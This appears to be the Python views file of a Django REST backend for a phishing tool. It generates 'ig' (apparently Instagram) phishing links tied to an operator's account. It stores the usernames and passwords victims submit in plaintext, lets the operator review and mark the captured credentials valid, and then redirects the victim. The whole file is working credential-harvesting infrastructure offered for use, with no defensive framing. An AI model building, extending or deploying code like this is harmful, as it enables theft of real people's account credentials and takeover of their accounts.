from .models import *
from .serializers import *

from django.contrib.auth import authenticate
from rest_framework.authtoken.models import Token
from rest_framework.response import Response
from rest_framework.decorators import api_view

import random, string

# funcitons that wont render

def fetch_user_data(user):
    sessions_list = []
    sessions = PhishSession.objects.filter(user = user).order_by("-created")
    for sess in sessions:
        tries = TriesSerializer(Tries.objects.filter(session = sess).order_by("-time"), many = True).data
        sessions_list.append({"session": PhishSessionSerializer(sess).data, "tries" : tries})
    print(sessions_list)
    return sessions_list
def generate_session(gen_type, data):

    user = authenticate(username = data['username'], password = data['password'])
    if user is None:
        return None
    chars = string.ascii_lowercase + string.digits  
    session_id = "".join(random.choices(chars, k = 20))
    session = PhishSession.objects.create(session_id = session_id, user = user, gen_type = data['linkType'], redirect = data['redirect'])
    token, created = Token.objects.get_or_create(user = user)
    return {"session":session, "key": token.key}


# views to redner

@api_view(['GET'])
def index(request):

    return Response(status = 200)

@api_view(['POST'])
def generate_link(request, gen_type):

    if gen_type == "ig":
        if request.data['redirect'].strip() == "":
            return Response({'msg':"Provide redirect url"}, status = 400)
        ig_session = generate_session(gen_type, request.data)
        if ig_session is None:
            return Response({'msg':"User details invalid"}, status = 400)
        context = {"phish_link" : ig_session['session'].session_id, "user" : ig_session['key']}
        return Response(context, status = 200)
    return Response({'msg':"Restricted"}, status = 400)

@api_view(['POST'])
def login_request(request):
    data = request.data
    user = authenticate(username = data['username'], password = data['password'])
    if user is None:
        return Response({'msg':"invalid credentials"}, status = 400)
    token, created = Token.objects.get_or_create(user = user)
    return Response({'key':token.key}, status = 200)

@api_view(['GET'])
def fetch_data(request):
    try:
        user = Token.objects.get(key = request.headers['Authorization']).user
    except Token.DoesNotExist:
        return Response({'msg':"Un auth"}, status = 401)
    
    data = fetch_user_data(user)
    return Response({'msg':data}, status = 200)

@api_view(['POST'])
def handle_session(request, session_id, action):
    
    try:
        user = Token.objects.get(key = session_id).user.username
    except Token.DoesNotExist:
        try:
            session = PhishSession.objects.get(session_id = session_id)
            if action == "connect":
                session.is_online = True
            elif action == "disconnect":
                session.is_online = False
            session.save()
            user = session.user.username
        except PhishSession.DoesNotExist:
            return Response({'msg':"Not found"}, status = 404)
    
    if action == "connect":
        return Response({'user':user}, status = 200)
    
    if action == "final":
        data = request.data
        
        existing = Tries.objects.filter(username = data['username'], password = data['password'])
            
        if not existing:
            try_id = str(random.randint(10000000000000, 90000000000000000000))
            new_try = Tries.objects.create(session = session, try_id = try_id, username = data['username'], password = data['password'], valid = False)
            return Response({"try" : TriesSerializer(new_try).data}, status = 200)
        
    if action == "validate":
        user = Token.objects.get(key = request.headers['Authorization']).user
        if session.user == user:
            try_obj = Tries.objects.get(try_id = request.headers['try-id'])
            try_obj.valid = True
            try_obj.save()
            return Response({"redirect": session.redirect}, status = 200)

    return Response({'msg':"Not found"}, status = 404)

